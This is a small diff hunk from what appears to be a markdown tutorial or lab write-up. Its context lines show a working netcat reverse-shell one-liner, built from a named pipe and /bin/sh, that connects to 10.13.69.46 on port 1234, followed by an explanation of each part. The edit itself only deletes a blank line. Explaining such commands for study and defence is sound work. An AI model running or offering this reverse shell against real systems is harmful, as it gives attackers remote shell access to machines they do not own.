@@ -78,7 +78,6 @@ rm -f /tmp/fifo && mkfifo /tmp/fifo
 cat /tmp/fifo | /bin/sh 2>&1 | nc 10.13.69.46 1234 > /tmp/fifo
 ```
 ### Explanation:
-
 - `mkfifo /tmp/fifo`: Creates a named pipe (FIFO) at `/tmp/fifo` for communication.
 - `cat /tmp/fifo`: Reads from the named pipe (which gets its input from the shell).
 - `/bin/sh 2>&1`: Runs a shell, redirecting both stdout and stderr to the pipe.
